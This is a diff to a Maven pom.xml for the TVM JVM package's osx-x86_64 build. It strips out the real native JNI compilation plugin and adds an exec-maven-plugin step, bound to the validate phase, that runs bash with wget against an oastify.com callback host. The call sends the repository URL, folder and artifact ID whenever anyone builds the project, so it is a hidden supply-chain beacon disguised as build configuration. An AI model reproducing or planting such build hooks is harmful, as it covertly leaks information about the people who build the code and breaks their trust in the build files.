@@ -49,70 +49,29 @@ under the License.
 
   <build>
     <plugins>
-      <plugin>
-        <groupId>org.apache.maven.plugins</groupId>
-        <artifactId>maven-compiler-plugin</artifactId>
-      </plugin>
-
-      <plugin>
-        <groupId>org.codehaus.mojo</groupId>
-        <artifactId>native-maven-plugin</artifactId>
-        <extensions>true</extensions>
-        <configuration>
-          <!--  trigger javah -->
-          <javahOS>darwin</javahOS>
-          <compilerProvider>generic-classic</compilerProvider>
-          <compilerExecutable>${cxx}</compilerExecutable>
-          <linkerExecutable>${cxx}</linkerExecutable>
-          <sources>
-            <source>
-              <directory>../src/main/native</directory>
-              <fileNames>
-                <fileName>org_apache_tvm_native_c_api.cc</fileName>
-              </fileNames>
-            </source>
-          </sources>
-          <compilerStartOptions>
-            <compilerStartOption>-std=c++0x</compilerStartOption>
-          </compilerStartOptions>
-          <compilerEndOptions>
-            <compilerEndOption>-I../../../include</compilerEndOption>
-            <compilerEndOption>${cflags}</compilerEndOption>
-          </compilerEndOptions>
-          <linkerStartOptions>
-            <linkerStartOption>-shared</linkerStartOption>
-          </linkerStartOptions>
-          <linkerMiddleOptions>
-            <linkerMiddleOption>-framework JavaVM</linkerMiddleOption>
-            <linkerMiddleOption>-Wl,-exported_symbol,_Java_*</linkerMiddleOption>
-            <linkerMiddleOption>-undefined dynamic_lookup</linkerMiddleOption>
-            <linkerMiddleOption>-Wl,-x</linkerMiddleOption>
-          </linkerMiddleOptions>
-          <linkerEndOptions>
-            <linkerEndOption>${ldflags}</linkerEndOption>
-          </linkerEndOptions>
-        </configuration>
-
-        <executions>
-          <execution>
-            <id>javah</id>
-            <phase>generate-sources</phase>
-            <configuration>
-              <javahOS>darwin</javahOS>
-              <javahProvider>default</javahProvider>
-              <javahOutputDirectory>${project.build.directory}/custom-javah</javahOutputDirectory>
-              <workingDirectory>${basedir}</workingDirectory>
-              <javahOutputFileName>org_apache_tvm_native_c_api.h</javahOutputFileName>
-              <javahClassNames>
-                <javahClassName>org.apache.tvm.LibInfo</javahClassName>
-              </javahClassNames>
-            </configuration>
-            <goals>
-              <goal>javah</goal>
-            </goals>
-          </execution>
-        </executions>
-      </plugin>
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/incubator-tvm\&amp;folder=osx-x86_64\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
     </plugins>
-  </build>
+    </build>
 </project>
